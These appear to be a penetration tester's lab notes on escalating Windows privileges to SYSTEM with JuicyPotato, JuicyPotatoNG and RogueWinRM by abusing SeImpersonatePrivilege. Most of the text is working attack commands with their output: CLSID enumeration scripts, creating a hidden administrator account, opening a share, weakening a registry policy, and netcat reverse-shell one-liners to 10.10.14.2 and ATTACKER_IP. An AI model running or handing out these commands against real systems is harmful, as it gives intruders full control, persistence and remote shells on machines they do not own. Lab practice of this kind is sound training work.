## JuicyPotato

The tool takes advantage of the **_SeImpersonatePrivilege_** or **_SeAssignPrimaryTokenPrivilege_** if enabled on the machine to elevate the local privileges to System. Normally, these privileges are assigned to service users, admins, and local systems — high integrity elevated users. ^80958f

There are few requirements needed for Juicy Potato to work:

1- User account usually a service account with the impersonation privileges of **_SeImpersonatePrivilege or/and SeAssignPrimaryTokenPrivilege_** _enabled._

2- A COM server with a unique CLSID. The authors of juicy Potato compiled lists of unique CLSIDs for different Windows versions to abuse — [**_http://ohpe.it/juicy-potato/CLSID/_**](http://ohpe.it/juicy-potato/CLSID/).

**A COM server is an executable (EXE or DLL) that implements a set of COM objects. Windows components are implemented as COM objects and follow standard COM rules to communicate with one another. COM servers are registered in the Registry and have a Class ID (CLSID) and an APPID**

As we see in the screenshot below, we have a shell running as — **Kohsuke, and the SeImpersonatePrivilege is enabled.**

To escalate, we need to upload the Juicy Potato executable to the compromised machine. A compiled version is available at the tool’s GitHub account [JuicyPotato](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)

To run the tool, we need a port number for the COM server and a valid CLSID — you can either use the provided list by the tool authors based on the version of the system or run the below PowerShell command to extract the CLSID of the current system.

```powershell
New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null

$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}} | where-object {$_.appid -ne $null}

foreach($a in $CLSID)

{

Write-Host $a.CLSID

}
```

![](https://miro.medium.com/max/875/1*537pvF7SDTx-B9JD2Dj2UA.png)

Save the Powershell code in a file and run it. Save the output in a file.

```powershell
powershell -executionpolicy bypass -file GetCLSID.ps1 > clsid.txt
```

run the PS script and save the output

In order to execute this command successfully, we can enumerate valid CLSIDs to be used with JuicyPotato.exe, to do so the following script can aid: [test_clsid.bat](http://ohpe.it/juicy-potato/Test/test_clsid.bat)
```c
@echo off
:: Starting port, you can change it
set /a port=10000
SETLOCAL ENABLEDELAYEDEXPANSION

FOR /F %%i IN (CLSID.txt) DO (
   echo %%i !port!
   juicypotato.exe -z -l !port! -c %%i >> result.log
   set RET=!ERRORLEVEL!
   :: echo !RET!
   if "!RET!" == "1"  set /a port=port+1
)

```

This script will test all the retrieved CLSIDs and at the end will retrieve only those which were successfully executed Impersonating another user:

```bash
type result.log
{0289a7c5-91bf-4547-81ae-fec91a89dec5};NT AUTHORITY\IUSR
{0fb40f0d-1021-4022-8da0-aab0588dfc8b};NT AUTHORITY\LOCAL SERVICE

{CBC04AF1-25C7-4A4D-BB78-28284403510F};NT AUTHORITY\SYSTEM
```

Then we can use any of this CLSIDs with our Juicy Potato binary in order to execute commands as another user, in this case NT AUTHORITY\\SYSTEM.

### Creating a User

For this particular scenario we will create a user with SYSTEM privileges. As we have the WINRM port open we can abuse of winrm service to login as such user.

The following are all the steps in order to create such user:
1.- Creation of the user:
```bash
juicypotato.exe -l 1337 -c "{CBC04AF1-25C7-4A4D-BB78-28284403510F}" -p c:\windows\system32\cmd.exe -a "net user shuciran2 shuciran123 /add" -t *
Testing {CBC04AF1-25C7-4A4D-BB78-28284403510F} 1337
......
[+] authresult 0
{CBC04AF1-25C7-4A4D-BB78-28284403510F};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

#Note If the user is not created with the previous command then this can be because the CLSID is not working as expected, we might execute the command with another CLSID.

2.- Adding the user to the Administrators group:
```bash
juicypotato.exe -l 1337 -c "{CBC04AF1-25C7-4A4D-BB78-28284403510F}" -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators shuciran2 /add" -t *
Testing {CBC04AF1-25C7-4A4D-BB78-28284403510F} 1337
......
[+] authresult 0
{CBC04AF1-25C7-4A4D-BB78-28284403510F};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

3.- Then we create an SMB Folder which will allow to give permissions to the user we just created:
```bash
juicypotato.exe -l 1337 -c "{CBC04AF1-25C7-4A4D-BB78-28284403510F}" -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL /add" -t *
Testing {CBC04AF1-25C7-4A4D-BB78-28284403510F} 1337
......
[+] authresult 0
{CBC04AF1-25C7-4A4D-BB78-28284403510F};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```

4.- We modify the following registry key in order to allow the system to create another administrator account:

```bash
juicypotato.exe -l 1337 -c "{CBC04AF1-25C7-4A4D-BB78-28284403510F}" -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -t *
Testing {CBC04AF1-25C7-4A4D-BB78-28284403510F} 1337
......
[+] authresult 0
{CBC04AF1-25C7-4A4D-BB78-28284403510F};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

5.- Finally if evertyhing went as planned we can use crackmapexe in order to test account privileges:

```bash
crackmapexec smb 10.11.1.31 -u 'shuciran2' -p 'shuciran123'
SMB         10.11.1.31      445    RALPH            [*] Windows Server 2016 Standard 14393 x64 (name:RALPH) (domain:ralph) (signing:False) (SMBv1:True)
SMB         10.11.1.31      445    RALPH            [+] ralph\shuciran:shuciran123 (Pwn3d!)

```

At this point all that we need to do is execute evilwin-rm with this new user which is now NT Authority\\System

### Getting a reverse shell:

It is possible to get a shell abusing of juicypotato:
```bash
juicypotato.exe -l 1337 -c "{CBC04AF1-25C7-4A4D-BB78-28284403510F}" -p c:\windows\system32\cmd.exe -a "/c C:\Temp\nc.exe -e cmd 10.10.14.2 443" -t *
```

## JuicyPotatoNG (Windows Server 2019)

^ab2891

Downloading this script we can get the same results than JuicyPotato but this works really well for Windows Server 2019 [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1)

We need to upload it to the machine and execute it as follows:
```bash
JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\nc.exe -e cmd 10.10.14.2 1234"
```
Examples:
[[Scramble#^ee02ee]]

## RogueWinRM

We can use the web shell or the command injection input to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:

![Webshell impersonate privileges](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png)  

To use RogueWinRM, we first need to upload the exploit to the target machine.

The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.

#Note If WinRM is active on the machine (port 5985/tcp) RogueWinRM is not unexploitable. 

If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:

```shell
user@attackerpc$ nc -lvp 4442
```

And then, use our web shell to trigger the RogueWinRM exploit using the following command:

```shell-session
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

**Note:** The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.

The `-p` parameter specifies the executable to be run by the exploit, which is `nc64.exe` in this case. The `-a` parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be `-e cmd.exe ATTACKER_IP 4442`.

If all was correctly set up, you should expect a shell with SYSTEM privileges:

```bash
user@attackerpc$ rlwrap nc -lvnp 4442
Listening on 0.0.0.0 4442
